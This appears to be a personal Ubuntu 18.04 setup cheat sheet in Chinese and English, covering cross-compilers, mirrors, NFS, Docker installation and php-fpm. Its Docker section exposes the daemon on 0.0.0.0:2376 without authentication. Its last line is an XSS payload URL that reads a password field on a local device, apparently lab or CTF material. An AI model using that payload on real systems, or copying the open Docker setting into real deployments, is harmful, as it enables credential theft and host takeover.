## ubuntu1804
sudo apt-get install ttf-wqy-zenhei
sudo apt-get install xfonts-wqy
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
dpkg -i google-chrome-stable_current_amd64.deb 
##  编译环境

### 32位
 sudo apt install -y build-essential &&
 sudo apt install -y libc6-dev-i386 &&
 sudo apt install -y gcc-multilib g++-multilib 
可以使用-m32 编译32位程序啦

apt install python-pip python3-pip build-essential libc6-dev-i386 gcc-multilib g++-multilib gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf libc6-armel-cross libc6-dev-armel-cross binutils-arm-linux-gnueabi gcc-arm-linux-gnueabi g++-arm-linux-gnueabilibncurses5-dev gcc-mips-linux-gnu

### arm/misp
sudo apt-get install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf
sudo apt-get install libc6-armel-cross libc6-dev-armel-cross binutils-arm-linux-gnueabi 
sudo apt-get install gcc-arm-linux-gnueabi 
apt install gcc-mips-linux-gnu
## change source

sudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list
## nfs
### /etc/export 配置详解
- https://www.cnblogs.com/huangzhen/archive/2012/08/15/2640371.html
- 还有arch的官方文档
- 更改/etc/exports后，需要exportfs -av
### stop broken nfs
umount -f -l /mnt/myfolder
## docker

sudo apt-get install -y\
    apt-transport-https \
    ca-certificates \
    curl \
    software-properties-common &&
curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add - &&

sudo add-apt-repository \
   "deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \
   $(lsb_release -cs) \
   stable" &&
sudo apt-get update &&
sudo apt-get install -y docker-ce


sudo echo -e "{\n 
  \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn/\"]
}" >/etc/docker/daemon.json 
sudo systemctl restart docker

### docker监听tcp

```bash
# 查看配置文件位于哪里
systemctl show --property=FragmentPath docker 
#编辑配置文件内容，接收所有ip请求
sudo vim /lib/systemd/system/docker.service  
ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2376
#重新加载配置文件，重启docker daemon
sudo systemctl daemon-reload
sudo systemctl restart docker
```

## docker proxt set
```sh
if [ ! -d "/etc/systemd/system/docker.service.d/"]; then
    mkdir /etc/systemd/system/docker.service.d/
fi

if [ ! -d "/etc/systemd/system/docker.service.d/"]; then
    mkdir /etc/systemd/system/docker.service.d/
fi
echo '[Service]
Environment="HTTP_PROXY=http://127.0.0.1:8123" "HTTPS_PROXY=http://127.0.0.1:8123" "NO_PROXY=localhost,127.0.0.1"' > /etc/systemd/system/docker.service.d/http-proxy.conf

systemctl daemon-reload
systemctl restart docker
```


## 如何重启php

启动php-fpm:

/usr/local/php/sbin/php-fpm
INT, TERM 立刻终止
QUIT 平滑终止
USR1 重新打开日志文件
USR2 平滑重载所有worker进程并重新载入配置和二进制模块
先查看php-fpm的master进程号
kill -USR2 \<master pid\>


## fbctf
https://blog.ctftools.com/2017/03/post122/
https://github.com/facebook/fbctf/wiki/Installation-Guide,-Production


http://192.168.168.42/?LanmanErrorCode=%3Cscript%3EsetTimeout(function(){alert(document.getElementById(%22password%22).value);},1000);%3C/script%3E